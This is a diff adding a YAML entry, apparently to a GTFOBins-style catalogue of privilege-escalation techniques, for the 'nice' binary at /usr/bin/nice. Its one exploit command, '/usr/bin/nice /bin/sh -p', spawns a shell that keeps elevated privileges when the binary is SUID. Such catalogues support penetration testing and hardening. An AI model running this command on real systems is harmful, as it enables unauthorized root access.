@@ -1,0 +1,4 @@
+name: nice
+binary_path: /usr/bin/nice
+exploit_cmds:
+- /usr/bin/nice /bin/sh -p
